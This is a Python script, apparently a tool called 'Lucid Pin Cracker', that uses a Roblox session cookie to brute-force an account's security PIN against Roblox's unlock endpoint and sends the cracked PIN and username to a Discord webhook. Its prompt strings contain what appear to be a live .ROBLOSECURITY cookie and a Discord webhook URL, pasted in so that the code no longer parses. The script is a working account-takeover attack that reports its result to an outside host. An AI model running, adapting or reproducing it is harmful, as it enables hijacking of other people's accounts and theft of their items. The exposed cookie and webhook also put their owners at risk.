import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:'_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_645CDD17AD07CF257175F7DBC56E81DC523EF84D0F5BBD3F207135E32C4F1B248414773E777A5D9901F7A2BC78872A7D6C2EBC9F5154B93D876B54B1789B8B22E0A3759074A133CF27D6F78A39CB8867AF76EF3C5629F169294CD69B8D261E3D3A7E1BF80CBFAB966B3808811CBB98F4E0ADE3203813E922B50B13EC72C2B6450D5D7031234E6AEAFD99B082E034E84BABFF01D83550F1FF44601FE2AE98D40B0599B8186A5C89285C1A19F69B000A8487E6E92B395827276EFF1D23A1F1ABC0DDD5A0B1FD4DC0817D6CC41AAD76F09A5276D34F55BE0B59F5698CCBF8989C6967901CCBE454767D1B4EFA4B3A04FCD1A9D6F4BCE14831BBA1F0EF1112193AED5FFBFF6B13335A320ED401C4723ACF94F5FBAD1AB44FE5EF9A643A61BFB64B5B4C41675935D88355049216E7F61A246EC3CE827ADFE767279C1B8B989F13AD25A0CEAC7B1F61AF9D17C6FABA2EFC809685A1C6EED1266BDC1B264E89479E4558B30B69DA)
cookie = input()
os.system("cls")
print('')
print('Enter your webhook below:'https://discord.com/api/webhooks/1000701220844994572/dfwv2hbTcHiigest-bL5Si5T-cW8X3cHCrM0Zeo9IcXgdfD3d4Vn6Te89dZEJJb7-5di)
webhook = input()
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



